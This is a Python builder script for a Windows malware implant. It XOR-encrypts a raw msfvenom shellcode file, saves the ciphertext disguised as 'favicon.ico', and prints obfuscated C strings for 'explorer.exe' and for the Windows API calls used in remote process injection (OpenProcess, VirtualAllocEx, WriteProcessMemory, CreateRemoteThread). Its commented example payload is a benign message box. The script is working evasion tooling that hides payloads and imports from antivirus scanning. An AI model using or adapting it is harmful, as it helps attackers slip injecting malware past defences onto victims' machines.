import sys

def xor(data, key):
    key = str(key).encode()
    output_bytes = bytearray()

    for i in range(len(data)):
        current = data[i] if isinstance(data, bytes) else ord(data[i])
        current_key = key[i % len(key)]
        output_bytes.append(current ^ current_key)
    return output_bytes

def print_c_str(name, value):
    print(f"unsigned char {name}[] = {{ 0x" + ", 0x".join(hex(x)[2:] for x in value) + ", 0x0 };") # Ensure the C-String is null-terminated.

KEY = "mysecretkeee"  # Must match in `implant.cpp`.

# `msfvenom -p windows/x64/messagebox TEXT="Hello, World!" TITLE="Welcome" EXITFUNC=thread -f raw -o msgbox64.bin`
payload_filename = "msgbox64.bin"
payload_pt = b""
try:
    payload_pt = open(payload_filename, "rb").read()
except:
    print(f"Payload file '{payload_filename}' not found.")
    sys.exit()
payload_ct = xor(payload_pt, KEY)
# Write payload ct to resource file `favicon.ico`.
favicon = "favicon.ico"
with open(favicon, "wb") as fi:
    fi.write(payload_ct)

print_c_str("sKernel32Dll", xor("kernel32.dll", KEY))
print_c_str("sExplorerExe", xor("explorer.exe", KEY))

functions = [
    "VirtualAllocEx",
    "WriteProcessMemory",
    "CreateRemoteThread",
    "CloseHandle",
    "OpenProcess",
    "RtlMoveMemory",
    "VirtualAlloc",
    "SizeofResource",
    "LockResource",
    "LoadResource",
    "FindResourceA",
    "WaitForSingleObject",
    "lstrcmpiA",
    "Process32Next",
    "Process32First",
    "CreateToolhelp32Snapshot",
    "GetProcAddress",
    "GetModuleHandleA",
]
for f in functions:
    function_ct = xor(f, KEY)
    print_c_str(f"s{f}", function_ct)
